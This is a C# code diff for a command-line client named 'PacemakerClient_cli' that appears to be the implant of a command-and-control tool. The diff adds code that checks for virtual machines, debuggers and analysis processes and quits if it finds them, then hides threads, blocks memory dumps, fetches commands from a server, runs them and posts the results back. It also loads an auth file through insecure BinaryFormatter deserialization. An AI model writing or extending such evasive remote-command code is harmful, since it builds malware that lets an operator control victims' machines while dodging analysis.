@@ -22,10 +22,11 @@ namespace PacemakerClient_cli
     internal class Program
     {
         public static string server_hostname = "http://localhost:3000";
-        public static BinaryFormatter MainBinaryForammatter;
+        public static BinaryFormatter MainBinaryFormatter;
         public static AuthCore authObj;
         static Stream file_stream;
 
+       
         public async static Task InitialHandshake()
         {
             HttpClient Client = new HttpClient();
@@ -51,10 +52,10 @@ namespace PacemakerClient_cli
 
                 authObj = JsonConvert.DeserializeObject<AuthCore>(jsonResponse);
 
-                MainBinaryForammatter = new BinaryFormatter();
+                MainBinaryFormatter = new BinaryFormatter();
                 Stream stream1;
                 stream1 = File.Open("authObject.dat", FileMode.Open);       // serializing auth object
-                MainBinaryForammatter.Serialize(stream1, authObj);
+                MainBinaryFormatter.Serialize(stream1, authObj);
                 stream1.Close();
 
             }
@@ -74,14 +75,16 @@ namespace PacemakerClient_cli
 
             var response = await Client.PostAsync(server_hostname + "/core/getcmd", content);
 
+            string jsonString = await response.Content.ReadAsStringAsync();
+
+            Console.WriteLine(jsonString);
+
             Cmd cmdObj;
             CmdResult resultObj = new CmdResult();
 
             if (response.IsSuccessStatusCode)
             {
-                string jsonString = await response.Content.ReadAsStringAsync();
                 cmdObj = JsonConvert.DeserializeObject<Cmd>(jsonString);
-
 
                 if (cmdObj.active && cmdObj.command.Length > 0)
                 {
@@ -91,13 +94,47 @@ namespace PacemakerClient_cli
                     resultObj.jwt_key = authObj.JwtToken;
                     resultObj.commandId = cmdObj.commandId;
                 }
-            }else if (response.StatusCode == System.Net.HttpStatusCode.Unauthorized)
-            {
-                await authObj.refresh();
-                await GetAndRunCmd();
             }
+            
+            if (response.StatusCode == System.Net.HttpStatusCode.Unauthorized)
+            {
+                bool status = await authObj.refresh();
 
+                if(status == false) // false means refresh has expired and needs to reauthenticate...
+                {
+                    await KillSwitch();
+                }
+                else
+                {
+                    await GetAndRunCmd();
+                }
+
+            }
+           
             return resultObj;
+        }
+
+
+        public async static Task<bool> PostEffectiveResults(CmdResult resultJson)
+        {
+            HttpClient Client = new HttpClient();
+
+            string output = JsonConvert.SerializeObject(resultJson);
+
+            var content = new StringContent(output, Encoding.UTF8, "application/json");
+
+            var response = await Client.PutAsync(server_hostname + "/core/postresult", content);
+
+            string jsonString = await response.Content.ReadAsStringAsync();
+
+            if (response.IsSuccessStatusCode)
+            {
+                return true;
+            }
+            else
+            {
+                return false;
+            }
         }
 
         public static string GetInitialUserInformation(string option)
@@ -172,42 +209,84 @@ namespace PacemakerClient_cli
 
         static async Task Main(string[] args)
         {
-
-            if (File.Exists("authObject.dat"))
+            
+            if (Scanner.IsRunningInVM() == true)
             {
-                try
-                {
-                    BinaryFormatter MainBinaryForammatter5 = new BinaryFormatter();                           ///
-                    Stream stream2;                                                        /// 
-                    stream2 = File.Open("authObject.dat", FileMode.Open);
-                    authObj = (AuthCore)MainBinaryForammatter5.Deserialize(stream2);                         /// 
-                    stream2.Close();
-
-                }catch (Exception ex)
-                {
-                    Console.WriteLine(ex.Message);
-                    await InitialHandshake();
-                    Console.WriteLine("Finished authenticating");
-                }
-               
+                Console.WriteLine("Nope!");
+                return;
             }
+            if(Scanner.ScanBadProcesses() == true)
+            {
+                Console.WriteLine("Nope!");
+                return;
+            }
+            if(DbgPrt1.PerformOtherChecks() == true)
+            {
+                Console.WriteLine("Nope!");
+                return;
+            }
+
+
             else
             {
-                file_stream = File.Create("authObject.dat");
-                file_stream.Close();
+                DbgPrt2.HideOSThreads();
+                AntiDmp.AntiDump();
 
-                await InitialHandshake();
-        
-                Console.WriteLine("Finished authenticating");
+                if (File.Exists("authObject.dat"))
+                {
+                    try
+                    {
+                        BinaryFormatter MainBinaryFormatter5 = new BinaryFormatter();                           ///
+                        Stream stream2;                                                        /// 
+                        stream2 = File.Open("authObject.dat", FileMode.Open);
+                        authObj = (AuthCore)MainBinaryFormatter5.Deserialize(stream2);                         /// 
+                        stream2.Close();
+
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine(ex.Message);
+                        await InitialHandshake();
+                        Console.WriteLine("Finished authenticating");
+                    }
+
+                }
+                else
+                {
+                    file_stream = File.Create("authObject.dat");
+                    file_stream.Close();
+
+                    await InitialHandshake();
+
+                    Console.WriteLine("Finished authenticating");
+                }
+
+
+                Console.WriteLine("\nDoing something....\n");
+                Thread.Sleep(2000);
+
+                CmdResult resultObj = await GetAndRunCmd();
+
+                if (resultObj.result == null || resultObj.result.Length < 1)
+                {
+                    Console.WriteLine("Pass");
+                }
+                else
+                {
+                    bool postStatus = await PostEffectiveResults(resultObj);
+
+                    if (postStatus == false)
+                    {
+                        await KillSwitch();
+                    }
+                }
+
+                Thread.Sleep(3000);
+                Console.WriteLine("Got and Ran commands: ");
+                await KillSwitch();
+
+                Console.WriteLine("Done");
             }
-
-
-            Console.WriteLine("\nDoing something....\n");
-            Thread.Sleep(2000);
-           
-            await KillSwitch();
-
-            Console.WriteLine("Done");
         }
     }
 }
